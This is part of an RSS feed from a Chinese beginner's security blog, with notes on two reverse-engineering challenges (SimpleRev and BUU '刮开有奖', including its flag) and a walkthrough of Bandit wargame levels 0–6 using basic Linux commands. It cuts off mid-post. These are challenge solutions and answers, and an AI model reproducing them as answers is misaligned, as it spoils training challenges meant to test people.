        <guid>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/</guid>
        <description>&lt;p&gt;关于解题过程中出现的疑惑点。&lt;/p&gt;
&lt;p&gt;小白学习记录，大师傅勿喷，欢迎交流。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/1858293-20200412183333245-1665512153.png&#34;
	width=&#34;300&#34;
	height=&#34;213&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/1858293-20200412183333245-1665512153_hu3698894144565281984.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/1858293-20200412183333245-1665512153_hu11645424681315047308.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;140&#34;
		data-flex-basis=&#34;338px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在该题中，join和strcat都是实现拼接字符的功能。但是在我解题的过程发现当拼接src和v9字符串时，这两个字符串应该反过来接上，也就是key3+&amp;ldquo;hadow&amp;quot;和key+&amp;ldquo;NDCLS&amp;rdquo;。&lt;/p&gt;
&lt;p&gt;暂且认为是取出数据时是按照栈的推出来着，就像汇编里存取字节一样。学艺不精，网上没查到相关资料，姑且这样认为，且留下疑问。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/1858293-20200412183333627-1747828195.png&#34;
	width=&#34;450&#34;
	height=&#34;431&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/1858293-20200412183333627-1747828195_hu8428380982519710129.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/1858293-20200412183333627-1747828195_hu7940732768475405459.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;104&#34;
		data-flex-basis=&#34;250px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;此处存在模运算，如果想要解密的话需要模的逆运算。但是我还没有想到如何逆模运算，这里可能要涉及数论知识，先在这里指出来供日后修改。这里解题我是用暴力破解，每个遍历，符合条件了再break一下。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【个人记录】BUU_刮开有奖解题记录</title>
        <link>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Sun, 12 Apr 2020 04:00:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;p&gt;记录一次比较难受的解题过程&lt;/p&gt;
&lt;p&gt;Re小白慢慢刷题路，遇到一道目前对我来说稍有难度但却很适合提升的一道题&lt;/p&gt;
&lt;p&gt;做题过程比较痛苦，没有前面切题的快感&lt;/p&gt;
&lt;p&gt;在网上看了些师傅的wp做完的，仅用于记录，不算wp。&lt;/p&gt;
&lt;p&gt;大师傅们看到了图一乐就好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120021815-1569991091.png&#34;
	width=&#34;564&#34;
	height=&#34;603&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120021815-1569991091_hu5117952341959180118.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120021815-1569991091_hu10933478042868557758.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;93&#34;
		data-flex-basis=&#34;224px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;关于函数sub_4010F0:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022256-823111513.png&#34;
	width=&#34;476&#34;
	height=&#34;603&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022256-823111513_hu5602743927995019763.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022256-823111513_hu9252690725994822889.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;78&#34;
		data-flex-basis=&#34;189px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;粗略浏览大致可以推测是对v7-v17的数据进行变更替换。把这些数据放在数组中，Int型的数据占4位，所以可以把乘4的变量看作数组下标。&lt;/p&gt;
&lt;p&gt;阅读读不出结果，写一份代码自己跑结果：&lt;/p&gt;
&lt;p&gt;打开sub_401000函数，在里面找到了base64字符串，推断这是个加密函数，于是不再分析内部结构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022527-2068064584.png&#34;
	width=&#34;576&#34;
	height=&#34;29&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022527-2068064584_hu4395591310367257287.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022527-2068064584_hu14609538802343044579.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1986&#34;
		data-flex-basis=&#34;4766px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;对最后的分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022802-263903511.png&#34;
	width=&#34;497&#34;
	height=&#34;196&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022802-263903511_hu230384064999767228.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/1858293-20200412120022802-263903511_hu5006198916166871351.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;253&#34;
		data-flex-basis=&#34;608px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在函数sub_4010F0处理之后，字符串变味了，变成了3CEHJNSZagn，v7-v17的值也相应变化。&lt;/p&gt;
&lt;p&gt;String是我们输入的内容，将v4v5base64解密放到正确的位置即可。&lt;/p&gt;
&lt;p&gt;flag{UJWPWP1jMp}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Bandit  wargame个人闯关记录上（1-10）</title>
        <link>https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/</link>
        <pubDate>Sun, 05 Apr 2020 09:21:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/</guid>
        <description>&lt;h1 id=&#34;bandit-wargame闯关记录&#34;&gt;Bandit wargame闯关记录
&lt;/h1&gt;&lt;h2 id=&#34;level-0--level-1&#34;&gt;Level 0 —— Level 1
&lt;/h2&gt;&lt;p&gt;主要告诉我们如何SSH连接登陆服务器。&lt;/p&gt;
&lt;p&gt;这里我用的是FinalShell，输入好信息，勾上海外加速，开始做题：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172032332-1880627993.png&#34;
	width=&#34;554&#34;
	height=&#34;515&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172032332-1880627993_hu726853960115918572.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172032332-1880627993_hu285172314130983138.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;107&#34;
		data-flex-basis=&#34;258px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在做了几关之后发现每次进入下一个level都要修改用户名后面的数字，不然密码会匹配不上。&lt;/p&gt;
&lt;p&gt;进入第一关的密码就在用ls可以看到的一个名为readme的文件中，用命令【cat readme】可以查看并进入下一关。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172033107-590430074.png&#34;
	width=&#34;240&#34;
	height=&#34;60&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172033107-590430074_hu17318525115955060402.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172033107-590430074_hu2880792186532166462.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;400&#34;
		data-flex-basis=&#34;960px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-1--level-2&#34;&gt;Level 1 —— Level 2
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172033694-1883030601.png&#34;
	width=&#34;554&#34;
	height=&#34;237&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172033694-1883030601_hu10707323527846372663.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172033694-1883030601_hu14621765329419271303.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;561px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;根据任务提示我们可以知道，下一关的密码就在home/bandit1里面。可以看到里面的文件有一个名为-的，如果我们用指令【cat
-】的话，-不会被识别为名称。所以我们使用【cat ./-】来表示查看此文件夹下的-文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172034244-1794605283.png&#34;
	width=&#34;250&#34;
	height=&#34;98&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172034244-1794605283_hu18366832370031077470.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172034244-1794605283_hu12991914801983693149.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;255&#34;
		data-flex-basis=&#34;612px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-2--level-3&#34;&gt;Level 2 —— Level 3
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172034743-368715074.png&#34;
	width=&#34;554&#34;
	height=&#34;316&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172034743-368715074_hu1785850142382881641.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172034743-368715074_hu2229812899280403780.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;420px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进入level2，ls找文件，发现一个文件名字中带有空格，如果我们直接cat文件名的话是打不开的，因为空格会使系统认为这是四个不同的文件而非同一个文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172035240-2015826051.png&#34;
	width=&#34;330&#34;
	height=&#34;156&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172035240-2015826051_hu12804674919990529132.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172035240-2015826051_hu5941187796105163786.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;507px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果我们想要访问这样的一个文件，可以先Google一下&amp;quot;spaces in filename&amp;quot;，然后就学会了新技能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用引号：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172035678-1371634526.png&#34;
	width=&#34;348&#34;
	height=&#34;100&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172035678-1371634526_hu9775491450867559785.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172035678-1371634526_hu14617571745299332103.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;348&#34;
		data-flex-basis=&#34;835px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看起来单双都可&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用反斜杠\来表达原有意思：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036007-1639548638.png&#34;
	width=&#34;350&#34;
	height=&#34;60&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036007-1639548638_hu15633629143543900205.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036007-1639548638_hu16647830834520797023.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;583&#34;
		data-flex-basis=&#34;1400px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-3--level-4&#34;&gt;Level 3 —— Level 4
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036383-746777089.png&#34;
	width=&#34;541&#34;
	height=&#34;228&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036383-746777089_hu14521217042689276270.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036383-746777089_hu2442544399456433156.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;237&#34;
		data-flex-basis=&#34;569px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;任务目标：找出隐藏在inhere文件夹下的文件&lt;/p&gt;
&lt;p&gt;Linux中隐藏文件用的是在文件名前加. ，而我们使用【ls -a】可以显示所有文件，包括隐藏的文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036877-1894510597.png&#34;
	width=&#34;289&#34;
	height=&#34;139&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036877-1894510597_hu11810785749106438896.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172036877-1894510597_hu10059951955456909351.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-4--level-5&#34;&gt;Level 4 —— Level 5
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172037429-15893255.png&#34;
	width=&#34;554&#34;
	height=&#34;238&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172037429-15893255_hu9005127127478764732.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172037429-15893255_hu1497575378271402384.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;232&#34;
		data-flex-basis=&#34;558px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;任务要求中提到了&amp;quot;human—readable&amp;quot;，经过ls之后，看到很多的文件，我这里一个一个打开，其中一个文件里面存着下一关的密码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172038123-733743371.png&#34;
	width=&#34;495&#34;
	height=&#34;238&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172038123-733743371_hu11174274974043494355.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172038123-733743371_hu7108764650634984739.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;499px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;也可以用【file】命令来识别文件，【file ./*】将所有文件的格式显示出来。&lt;/p&gt;
&lt;h2 id=&#34;level-5--level-6&#34;&gt;Level 5 —— Level 6
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172038733-1303245549.png&#34;
	width=&#34;554&#34;
	height=&#34;220&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172038733-1303245549_hu13933679412219210726.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172038733-1303245549_hu18266570902477897678.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;251&#34;
		data-flex-basis=&#34;604px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;密码藏在inhere文件夹中，是一个人类可读文件，有1033字节，不可执行。&lt;/p&gt;
&lt;p&gt;Inhere文件中有好多个文件夹，一个一个效率过于低下，这里我们使用【find】命令&lt;/p&gt;
&lt;p&gt;【find -type f -size 1033c】&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039117-1883945247.png&#34;
	width=&#34;357&#34;
	height=&#34;39&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039117-1883945247_hu12696238712222320816.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039117-1883945247_hu17233599688583785551.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;915&#34;
		data-flex-basis=&#34;2196px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;找到文件，进入：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039495-900326744.png&#34;
	width=&#34;342&#34;
	height=&#34;61&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039495-900326744_hu2579245322103026700.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039495-900326744_hu16029655921165476917.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;560&#34;
		data-flex-basis=&#34;1345px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-6--level-7&#34;&gt;Level 6 —— Level 7
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039929-1659318185.png&#34;
	width=&#34;554&#34;
	height=&#34;238&#34;
